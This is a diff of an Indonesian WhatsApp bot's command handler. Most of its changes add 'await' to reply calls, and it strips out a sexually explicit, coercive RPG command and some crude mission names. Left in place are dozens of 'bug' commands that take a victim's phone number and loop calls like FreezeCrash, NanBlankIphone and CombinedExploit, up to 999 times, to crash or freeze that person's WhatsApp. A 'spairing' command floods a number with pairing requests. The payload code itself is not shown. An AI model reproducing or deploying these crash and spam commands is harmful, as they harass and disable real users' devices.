-      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
-      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastopenbo)
-      if (new Date() - global.db.erpg[m.sender].lastopenbo < 54000000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
-      let uwong = ['Azril', 'Amba', 'MarkZukbrg', 'Mulyono', 'Andree']
-      let userpname = pickRandom(uwong)
-      let hotel = await randomNomor(3, 6)
-      let uang = await randomNomor(7000, 34000)
-      let expusr = await randomNomor(8000, 13000)
-      let limit = await randomNomor(20, 80)
-      let stamina = await randomNomor(45, 85)
-      replyV1('Sedang Mencari Pelanggan...')
-      await sleep(5000)
-      replyV1(`Kamu Mendapatkan Pelanggan Bernama ${userpname} Dan Pergi Ke Hotel Bintang ${hotel}`)
-      await sleep(4000)
-      replyV1('Kamu Pun Mulai Melakukan Nganu Dengannya')
-      await sleep(6000)
-      replyV1('Kamu Di Paksa Untuk Melayaninya 24 Jam')
-      await sleep(4000)
-      replyV1(`Kamu Terbaring Lemas Karna Melakukan\nNgentod 24 Jam Dengan ${userpname},\nTetapi Kamu Mendapatkan : \n
-Uang : ${uang}
-Exp : ${expusr}
-Limit : ${limit}
-
-Stamina berkurang ${stamina}%`)
-      db.users[m.sender].saldo += uang
-      db.users[m.sender].exp += expusr
-      db.users[m.sender].limit += limit
-      global.db.erpg[m.sender].stamina -= stamina
-      global.db.erpg[m.sender].lastopenbo = new Date * 1
+      return replyV1('🛡️ Command open-bo dinonaktifkan. Untuk aktivitas RPG yang aman, gunakan .kerja, .nguli, atau .petualang.')
     }
     break
 
@@ -22510,19 +22538,19 @@ Stamina berkurang ${stamina}%`)
       if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastdailymisi)
       if (new Date() - global.db.erpg[m.sender].lastdailymisi < 86400000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
-      let misiget = ['Menangkap 30 lalat dalam 30 detik', 'Ngentod Janda', 'Menangkap anomali', 'Menangkap Maling', 'Menangkap Buronan', 'Menangkap azril', 'Mengejar Ilham', 'Membunuh MarkZukberg', 'Membunuh Tuhan', 'Berburu Perawan']
+      let misiget = ['Menangkap 30 lalat dalam 30 detik', 'Membantu pedagang pasar', 'Menangkap anomali', 'Menangkap maling dalam simulasi', 'Mengejar buronan dalam simulasi', 'Menolong warga desa', 'Mengantar paket tepat waktu', 'Melindungi gudang desa', 'Menjaga gerbang kota', 'Mencari tanaman langka']
       let mission = pickRandom(misiget)
       let uang = await randomNomor(7000, 34000)
       let expget = await randomNomor(8000, 13000)
       let limit = await randomNomor(20, 80)
       let stamina = await randomNomor(45, 85)
-      replyV1('Mencari Misi...')
+      await replyV1('Mencari Misi...')
       await sleep(3000)
-      replyV1(`Misi ${mission} Berhasil Didapatkan`)
+      await replyV1(`Misi ${mission} Berhasil Didapatkan`)
       await sleep(4000)
-      replyV1('Mengerjakan misi...')
+      await replyV1('Mengerjakan misi...')
       await sleep(10000)
-      replyV1(`${conn.getName(m.sender)} Berhasil Menyelesaikan Misi
+      await replyV1(`${conn.getName(m.sender)} Berhasil Menyelesaikan Misi
 Dan Kamu Mendapatkan :
 Uang : ${uang}
 Exp : ${expget}
@@ -22545,15 +22573,15 @@ Sramina Berkurang ${stamina}%`)
       if (new Date() - global.db.erpg[m.sender].lastngaji < 14400000) return replyV1(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
       let uang = randomNomor(3000, 6000)
       let expget = randomNomor(3000, 5000)
-      replyV1('Mencari Guru Ngaji....')
+      await replyV1('Mencari Guru Ngaji....')
       await sleep(7000)
-      replyV1('Ketemu ustadz..')
+      await replyV1('Ketemu ustadz..')
       await sleep(4000)
-      replyV1('Diajarin tajwid')
+      await replyV1('Diajarin tajwid')
       await sleep(3000)
-      replyV1('Ngasih tau, kalo qalqalah itu dipantulkan')
+      await replyV1('Ngasih tau, kalo qalqalah itu dipantulkan')
       await sleep(3000)
-      replyV1(`*—[ Hasil Ngaji ]—*
+      await replyV1(`*—[ Hasil Ngaji ]—*
 ➕💹 Uang jajan: ${uang}
 ➕✨ Exp: ${expget}
 ➕🤬 Dimarahin: -1`)
@@ -22567,7 +22595,7 @@ Sramina Berkurang ${stamina}%`)
     case 'cekskill': {
 
       if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      replyV1(`${global.db.erpg[m.sender].skillselect ? `Skill kamu : ${global.db.erpg[m.sender].skillselect}` : 'Kamu Belum Memiliki Skill'}`)
+      await replyV1(`${global.db.erpg[m.sender].skillselect ? `Skill kamu : ${global.db.erpg[m.sender].skillselect}` : 'Kamu Belum Memiliki Skill'}`)
     }
     break
 
@@ -22605,7 +22633,7 @@ db.redeem = db.redeem || {
 -  ${expgt} Exp
 -  ${limiter} Limit
 -  ${glimiter} Game Limit`
-        replyV1(teks)
+        await replyV1(teks)
         if (db.redeem.maxRedeem < 1) {
           const exhaustedRedeemCode = db.redeem.code;
           setTimeout(() => {
@@ -22620,7 +22648,7 @@ db.redeem = db.redeem || {
           }, 10 * 60 * 1000);
         }
       } else {
-        replyV1("*Gak ada redeem yang di berikan 😓*")
+        await replyV1("*Gak ada redeem yang di berikan 😓*")
       }
     }
     break
@@ -22644,7 +22672,7 @@ if (!isOwner) return replyV1(mess.owner || 'Command ini hanya bisa digunakan ole
       db.redeem.code = args[0]
       db.redeem.user = []
       db.redeem.maxRedeem = args[1]
-      replyV1('Code Redeem, Berhasil Di Setting*')
+      await replyV1('Code Redeem, Berhasil Di Setting*')
     }
     break
     case 'delredeem':
@@ -22658,10 +22686,10 @@ if (!isOwner) return replyV1(mess.owner || 'Command ini hanya bisa digunakan ole
         maxRedeem: 0
       }
       if (db.redeem.isRedeem) {
-        replyV1('*Redeem Code Dihapus!*')
+        await replyV1('*Redeem Code Dihapus!*')
         delete db.redeem
       } else {
-        replyV1('*Tidak ada sesi redeem*')
+        await replyV1('*Tidak ada sesi redeem*')
       }
     }
     break
@@ -22678,7 +22706,7 @@ if (!isOwner) return replyV1(mess.owner || 'Command ini hanya bisa digunakan ole
       db.redeem.user.forEach((nomor, index) => {
         list += `${index + 1}. ${nomor}\n`
       })
-      replyV1(list)
+      await replyV1(list)
     }
     break
 
@@ -23232,7 +23260,7 @@ case 'ww':
           return replyV1("Kamu tidak dalam sesi permainan");
         if (ww[chat].status === true)
           return replyV1("Permainan sudah dimulai, kamu tidak bisa keluar");
-        replyV1(`@${sender.split("@")[0]} Keluar dari permainan`, {
+        await replyV1(`@${sender.split("@")[0]} Keluar dari permainan`, {
           withTag: true,
         });
         playerExit(chat, sender, ww);
@@ -23351,7 +23379,7 @@ case 'grouplink': {
 ║ ${link}
 ║
 ╰──────────────────`
-        replyV1(teks)
+        await replyV1(teks)
     } catch (err) {
         console.error('ID TO LINK ERROR:', err)
         return replyV1(
@@ -23778,7 +23806,7 @@ let participants = metadata.participants
 
 let total = participants.length
 
-replyV1(`Total Member Grup : ${total}`)
+await replyV1(`Total Member Grup : ${total}`)
 }
 break
 case "infogc": {
@@ -23786,7 +23814,7 @@ if (!m.isGroup) return replyV1("Khusus grup")
 
 let metadata = await conn.groupMetadata(m.chat)
 
-replyV1(`Info Grup :
+await replyV1(`Info Grup :
 
 Nama : ${metadata.subject}
 ID : ${metadata.id}
@@ -23896,7 +23924,7 @@ if (!isCreator) return replyV1(mess.owner)
 let groups = await conn.groupFetchAllParticipating()
 let total = Object.keys(groups).length
 
-replyV1(`Total Grup Bot : ${total}`)
+await replyV1(`Total Grup Bot : ${total}`)
 }
 break
 case "idgrup": {
@@ -23949,11 +23977,11 @@ if (!isCreator && !isAdmins) return replyV1(mess.owner)
 
 try {
 let link = await conn.groupInviteCode(m.chat)
-replyV1(`Link Grup :
+await replyV1(`Link Grup :
 
 https://chat.whatsapp.com/${link}`)
 } catch {
-replyV1("Bot harus menjadi admin untuk mengambil link grup")
+await replyV1("Bot harus menjadi admin untuk mengambil link grup")
 }
 
 } else {
@@ -23961,11 +23989,11 @@ if (!isCreator) return replyV1(mess.owner)
 
 try {
 let link = await conn.groupInviteCode(m.chat)
-replyV1(`Link Grup :
+await replyV1(`Link Grup :
 
 https://chat.whatsapp.com/${link}`)
 } catch {
-replyV1("Bot harus menjadi admin untuk mengambil link grup")
+await replyV1("Bot harus menjadi admin untuk mengambil link grup")
 }
 
 }
@@ -24204,12 +24232,12 @@ let mode = args[0]
 
 if (mode === "on") {
 onlygc = true
-replyV1("✅ Only group diaktifkan")
+await replyV1("✅ Only group diaktifkan")
 } else if (mode === "off") {
 onlygc = false
-replyV1("❌ Only group dimatikan")
+await replyV1("❌ Only group dimatikan")
 } else {
-replyV1("Contoh:\n.onlygc on\n.onlygc off")
+await replyV1("Contoh:\n.onlygc on\n.onlygc off")
 }
 
 }
@@ -24225,7 +24253,7 @@ break
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await Delayinvis(target);
@@ -24245,7 +24273,7 @@ break
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 5; i++) {
                    await FreezeCrash(target);
@@ -24263,7 +24291,7 @@ break
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 200; i++) {
                    await fcv2(target);
@@ -24280,7 +24308,7 @@ break
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await NanBlankIphone(target);
@@ -24296,7 +24324,7 @@ break
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 90; i++) {
                    await Truenullv4(conn, target);
@@ -24315,7 +24343,7 @@ break
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 90; i++) {
                    await InvisibleCall(target);
@@ -24358,7 +24386,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! sent delay invisible to ${target}`);
+                await replyV1(`success! sent delay invisible to ${target}`);
                 
                  for (let i = 0; i < 10; i++) {
                    await CombinedExploit(target); 
@@ -24374,7 +24402,7 @@ case 'delaycombo': {
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 900; i++) {
                    await SettoDelaycombo(target);
@@ -24392,7 +24420,7 @@ case 'delaycombo': {
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await ArsyilOfficialForceInvisble(conn, target);
@@ -24409,7 +24437,7 @@ case 'delaycombo': {
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await ForceIphoneInvisible(target);
@@ -24426,7 +24454,7 @@ case 'delaycombo': {
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 1; i++) {
                    await ForcloseOneMSGV2(conn, target);
@@ -24442,7 +24470,7 @@ case 'delaycombo': {
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 300; i++) {
                    await xCursedFC(conn, target);
@@ -24471,7 +24499,7 @@ case "con4": {
         jidx = jidx.replace(/[^0-9]/g, "");
         let target = `${jidx}@s.whatsapp.net`;
 
-        replyV1(`✅ Menjalankan ${command.toUpperCase()} ke ${target}`);
+        await replyV1(`✅ Menjalankan ${command.toUpperCase()} ke ${target}`);
 
         for (let i = 0; i < 50; i++) {
             await ArsyilSedotMemeg(conn, target);
@@ -24481,7 +24509,7 @@ case "con4": {
 
     } catch (e) {
         console.error(`Error ${command}:`, e);
-        replyV1("❌ Error");
+        await replyV1("❌ Error");
     }
 }
 break;
@@ -24494,7 +24522,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 500; i++) {
                    await ArsyilSedotMemeg(conn, target);
@@ -24522,7 +24550,7 @@ break;
                 if (jidx.length < 10) return replyV1(`nomor tidak valid!`);
     
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);             
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);             
                 for (let i = 0; i < 5; i++) {
                     await CrashPacksNew(target); 
                 }
@@ -24537,7 +24565,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                     await ForceClickNewArsyilCynxo(target);
@@ -24556,7 +24584,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 200; i++) {
                     await OctoberNewUi(target);
@@ -24580,7 +24608,7 @@ break;
     case 'spairing': {
   if (!isCreator) return replyV1(mess.owner)
   if (!text) return replyV1(`Example: ${prefix + command} +628xxxxxx|150`);
-  replyV1('proses...');
+  await replyV1('proses...');
   let [peenis, pepekk = "200"] = text.split("|");
   let target = peenis.replace(/[^0-9]/g, '').trim();
   const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
@@ -24606,7 +24634,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 999; i++) {
                    await ArsyilCynxoBetaFC(conn, target);
@@ -24621,7 +24649,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 100; i++) {
                    await CrashXFreeze(target);
@@ -24637,7 +24665,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await await NullCrL(target);
@@ -24696,7 +24724,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! sent delay invisible to ${target}`);
+                await replyV1(`success! sent delay invisible to ${target}`);
                 
                  for (let i = 0; i < 50; i++) {
                    await inviscall(conn, target);
@@ -24715,7 +24743,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 200; i++) {
                    await StuckBlank(target);
@@ -24734,7 +24762,7 @@ break;
                 if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                 
                 let target = `${jidx}@s.whatsapp.net`;
-                replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
+                await replyV1(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                 
                  for (let i = 0; i < 50; i++) {
                    await TesFc(target);
@@ -24784,7 +24812,7 @@ case "skipcode": {
         };
 
     } catch (e) {
-        replyV1("❌ Gomene Error Mungkin lu kebanyakan request");
+        await replyV1("❌ Gomene Error Mungkin lu kebanyakan request");
         console.error(e);
     };
 };
@@ -24815,7 +24843,7 @@ case "tts": {
 
     } catch (e) {
         console.log(e);
-        replyV1("❌ Gagal convert text ke suara");
+        await replyV1("❌ Gagal convert text ke suara");
     }
 }
 break
@@ -24845,7 +24873,7 @@ case "ttsanime": {
 
     } catch (e) {
         console.log(e);
-        replyV1("❌ Gagal convert text ke suara anime");
+        await replyV1("❌ Gagal convert text ke suara anime");
     }
 }
 break;
@@ -25160,17 +25188,17 @@ case "tomedia": {
     try {
         let media = await m.quoted.download()
         if (!media) return replyV1(`❌ Gagal mengunduh media.`)
-        replyV1(" loading...")
+        await replyV1(" loading...")
         if (/image/.test(mime)) {
             await conn.sendMessage(m.chat, { image: media, caption: `✅ Berhasil dikonversi dari dokumen ke foto.` }, { quoted: m })
         } else if (/video/.test(mime)) {
             await conn.sendMessage(m.chat, { video: media, caption: `✅ Berhasil dikonversi dari dokumen ke video.` }, { quoted: m })
         } else {
-            replyV1(`❌ Format file tidak dikenali.`)
+            await replyV1(`❌ Format file tidak dikenali.`)
         }
     } catch (err) {
         console.error(err)
-        replyV1(`❌ Terjadi kesalahan saat konversi media.`)
+        await replyV1(`❌ Terjadi kesalahan saat konversi media.`)
     }
 }
 break
@@ -25259,7 +25287,7 @@ case 'ban': {
 
   const ok = addBannedUser(targetJid);
   if (ok) {
-    replyV1(`⛈️Sukses membanned:\n${targetJid}\nJika ingin membuka ban: .unban @user`);
+    await replyV1(`⛈️Sukses membanned:\n${targetJid}\nJika ingin membuka ban: .unban @user`);
     // opsional: log ke owner / group admin
     try {
       if (conn && conn.sendMessage) {
@@ -25373,7 +25401,7 @@ case "stfjawa": {
 
     } catch (e) {
         console.error("ERROR stfjawa:", e)
-        replyV1("❌ Gagal membuat sertifikat jawa")
+        await replyV1("❌ Gagal membuat sertifikat jawa")
     }
 }
 break
@@ -25444,7 +25472,7 @@ case "pegangtext": {
 
     } catch (e) {
         console.log(e)
-        replyV1("❌ Error load gambar / URL")
+        await replyV1("❌ Error load gambar / URL")
     }
 }
 break
@@ -25493,11 +25521,11 @@ try {
         })
     }
 
-    replyV1("✅ ViewOnce berhasil dikirim ke nomor!")
+    await replyV1("✅ ViewOnce berhasil dikirim ke nomor!")
 
 } catch (e) {
     console.log(e)
-    replyV1("❌ Gagal kirim viewOnce")
+    await replyV1("❌ Gagal kirim viewOnce")
 }
 }
 break
@@ -25601,7 +25629,7 @@ case "wantedganteng": {
 
     } catch (e) {
         console.log(e)
-        replyV1("❌ Error membuat poster")
+        await replyV1("❌ Error membuat poster")
     }
 }
 break
@@ -25682,7 +25710,7 @@ case "wanted": {
 
     } catch (e) {
         console.log(e)
-        replyV1("❌ Error membuat poster")
+        await replyV1("❌ Error membuat poster")
     }
 }
 break
@@ -25695,7 +25723,7 @@ if (!m.quoted) return replyV1("📸 reply gambar")
 let mime = (m.quoted.msg || m.quoted).mimetype || ''
 if (!mime.includes("image")) return replyV1("❌ harus gambar")
 
-replyV1("⏳ processing HD...")
+await replyV1("⏳ processing HD...")
 
 // 🔥 ambil buffer
 let buffer = await m.quoted.download()
@@ -25728,7 +25756,7 @@ caption: "✨ HD 4x berhasil\n> XNALZNOTDEV"
 
 } catch (e) {
 console.log("ERROR HD:", e)
-replyV1("❌ gagal convert HD (image tidak support)")
+await replyV1("❌ gagal convert HD (image tidak support)")
 }
 }
 break
@@ -25741,7 +25769,7 @@ const input2 = input.split("@")[0]
 if (input2 === global.owner || premium.includes(input) || input === botNumber) return replyV1(`Nomor ${input2} sudah menjadi reseller!`)
 premium.push(input)
 await fs.writeFileSync(projectPath('library', 'database', 'premium.json'), JSON.stringify(premium, null, 2))
-replyV1(`Berhasil menambah User kacung jadi Prem  ✅`)
+await replyV1(`Berhasil menambah User kacung jadi Prem  ✅`)
 }
 break
 
@@ -25757,7 +25785,7 @@ case 'statgroup': {
     const name = conn.getName ? await conn.getName(user) : user.split('@')[0]
     teks += `${i++}. ${name} - ${total} chat\n`
   }
-  replyV1(teks)
+  await replyV1(teks)
 }
 break
 
@@ -26027,7 +26055,7 @@ const sfile = {
       await sendScraprToWhatsApp(conn, m, scraprResult);
     } catch (scraprError) {
       console.warn('[SCRAPR SFILE FALLBACK]', scraprError?.message || scraprError);
-      replyV1(e?.message || 'Gagal mengunduh Sfile.');
+      await replyV1(e?.message || 'Gagal mengunduh Sfile.');
     }
   }
 }
@@ -26085,7 +26113,7 @@ case 'tofigure2': {
 
     const resultBuffer = Buffer.from(resApi.data);
